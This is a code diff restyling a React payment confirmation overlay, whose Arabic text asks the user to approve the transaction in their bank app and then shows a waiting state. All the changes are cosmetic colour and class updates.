@@ -169,13 +169,13 @@ export default function ConfiPage() {
       )}
 
       {(_v6Status === "message") && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a4a68]/95" dir="rtl">
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0d47a1]/95" dir="rtl">
           <div className="text-center space-y-6 px-8">
             <div className="relative mx-auto flex h-24 w-24 items-center justify-center">
-              <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-yellow-400/30" />
-              <div className="absolute h-20 w-20 rounded-full border-4 border-yellow-400/50" />
-              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-yellow-400/20">
-                <Smartphone className="h-8 w-8 text-yellow-400" />
+              <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-white/30" />
+              <div className="absolute h-20 w-20 rounded-full border-4 border-white/50" />
+              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-white/20">
+                <Smartphone className="h-8 w-8 text-white" />
               </div>
             </div>
             <div className="space-y-3">
@@ -183,29 +183,24 @@ export default function ConfiPage() {
                 تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك والموافقة على العملية لإتمام الدفع.
               </p>
               <div className="flex items-center justify-center gap-2">
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "0ms" }} />
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "150ms" }} />
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "300ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "0ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "150ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "300ms" }} />
               </div>
             </div>
             {isConfirming ? (
               <div className="flex flex-col items-center gap-3 mt-2">
                 <div className="flex items-center justify-center gap-2">
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "0ms" }} />
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "150ms" }} />
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "300ms" }} />
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "0ms" }} />
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "150ms" }} />
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "300ms" }} />
                 </div>
-                <p className="text-sm font-semibold text-yellow-300">جاري انتظار موافقة البنك...</p>
+                <p className="text-sm font-semibold text-[#90caf9]">جاري انتظار موافقة البنك...</p>
               </div>
             ) : (
               <button
                 onClick={handleMessageConfirm}
-                className="mt-2 w-full max-w-xs rounded-2xl px-6 py-3 font-bold text-sm transition-all"
-                style={{
-                  background: "linear-gradient(135deg, #1976d2 0%, #e09a18 100%)",
-                  color: "#1a3d52",
-                  boxShadow: "0 6px 20px rgba(244,173,39,0.35)",
-                }}
+                className="mt-2 w-full max-w-xs rounded-2xl px-6 py-3 font-bold text-sm bg-white text-[#1565c0] hover:bg-[#e3f2fd] transition-all shadow-lg"
               >
                 تم الموافقة في التطبيق
               </button>
@@ -228,8 +223,8 @@ export default function ConfiPage() {
             </Alert>
           )}
 
-          <div className="rounded-xl border border-[#d9e9df] bg-[#f4fbf7] p-4">
-            <div className="space-y-2 text-sm text-[#2f6c54]">
+          <div className="rounded-xl border border-[#bbdefb] bg-[#e3f2fd] p-4">
+            <div className="space-y-2 text-sm text-[#1565c0]">
               <div className="flex items-center gap-2">
                 <ShieldCheck className="h-4 w-4" />
                 <span>للتأكد من هويتك وحماية حسابك</span>
